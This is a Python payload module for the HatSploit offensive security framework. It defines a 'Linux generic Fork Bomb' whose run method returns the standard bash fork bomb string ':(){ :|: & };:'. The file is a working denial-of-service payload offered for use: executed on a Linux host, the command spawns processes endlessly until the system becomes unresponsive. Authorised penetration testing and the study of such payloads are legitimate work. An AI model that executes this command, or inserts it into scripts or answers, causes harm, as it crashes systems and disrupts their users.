"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux generic Fork Bomb",
            'Payload': "linux/generic/fork_bomb",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Linux generic fork bomb.",
            'Architecture': "generic",
            'Platform': "linux",
            'Rank': "high",
            'Type': "one_side",
        }

    def run(self):
        return ':(){ :|: & };:'
